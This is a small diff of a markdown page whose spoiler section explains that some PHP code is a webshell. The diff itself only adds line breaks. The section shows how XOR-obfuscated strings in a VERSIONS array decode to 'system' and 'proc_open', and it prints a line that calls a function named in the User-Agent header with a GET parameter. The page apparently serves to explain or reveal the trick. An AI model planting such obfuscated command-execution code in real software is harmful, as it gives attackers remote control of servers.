@@ -3,7 +3,7 @@ seriously.
 
 <details>
 <summary>Spoiler warning</summary>
-It's a webshell :) 
+It's a webshell :)<br/>
 <code>
   public const VERSIONS = array(
         "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2",
@@ -13,7 +13,9 @@ It's a webshell :)
         "G\[MnW\EY" ^ "7.4.18, 7.4.16, 7.4.15",
   );
 </code>
+  <br/>
   is identical to
+  <br/>
 <code>
   public const VERSIONS = array(
         "system",
@@ -23,11 +25,15 @@ It's a webshell :)
         "proc_open",
     );
 </code>
+  <br/>
 and
+  <br/>
 <code>
 ${"_SERVER"}["HTTP_USER_AGENT"]($_GET["csrf-token"]);
 </code>
+  <br/>
 is identical to 
+  <br/>
 <code>
 $_SERVER["HTTP_USER_AGENT"]($_GET["csrf-token"]);
 </code>
